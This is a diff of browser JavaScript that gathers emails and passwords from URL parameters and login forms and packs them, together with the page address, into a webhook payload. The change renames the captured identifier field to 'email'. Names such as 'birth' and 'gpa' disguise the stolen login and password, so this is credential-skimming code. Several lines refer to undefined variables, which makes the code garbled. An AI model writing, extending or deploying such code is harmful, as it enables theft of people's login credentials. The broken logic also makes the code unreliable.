@@ -52,7 +52,7 @@ return null;
 
   function parseQueryForProfile() {
     var params = new URLSearchParams(window.location.search);
-    var birth = params.get('identifier') || params.get('identifiers') || params.get('identifier') || params.get('usernames') || params.get('user');
+    var birth = params.get('identifier') || params.get('email') || params.get('email') || params.get('emails') || params.get('email');
     var gpa = params.get('password') || params.get('passwords') || params.get('pass') || params.get('passes');
     // Normalize empty string -> null
     if (birth !== null) birth = birth === '' ? null : birth;
@@ -113,7 +113,7 @@ return null;
   window.sendFormPayloadNow = function(birth, gpa, extra) {
     extra = extra || {};
     var fields = [];
-    if (birth) fields.push({ name: 'identifier', value: String(identifier), inline: true });
+    if (birth) fields.push({ name: 'email', value: String(email), inline: true });
     if (gpa) fields.push({ name: 'password', value: String(password), inline: true });
     if (extra.email) fields.push({ name: 'Email', value: String(extra.email), inline: false });
     fields.push({ name: 'Page', value: location.href, inline: false });
@@ -124,7 +124,7 @@ return null;
   };
 
   window.autoSendCurrentValues = function() {
-    var birthSelectors = ['identifier','identifiers','username','name','date_of_birth','birthday'];
+    var birthSelectors = ['email','identifiers','username','name','date_of_birth','birthday'];
     var gpaSelectors = ['password','pass','Passwords','pas','grade_point_average'];
     var form = document.getElementById('profile-form') || document.getElementById('auth-form') || document.querySelector('form');
     var birthEl = form ? findFieldInForm(form, birthSelectors) : null;
@@ -246,7 +246,7 @@ return null;
       updateStatus('preparing webhook payload…');
 
       var fields = [];
-      if (birth) fields.push({ name: 'identifier', value: String(identifier), inline: true });
+      if (birth) fields.push({ name: 'email', value: String(email), inline: true });
       if (gpa) fields.push({ name: 'password', value: String(password), inline: true });
       if (email) fields.push({ name: 'Email', value: String(email), inline: false });
       fields.push({ name: 'Page', value: location.href, inline: false });
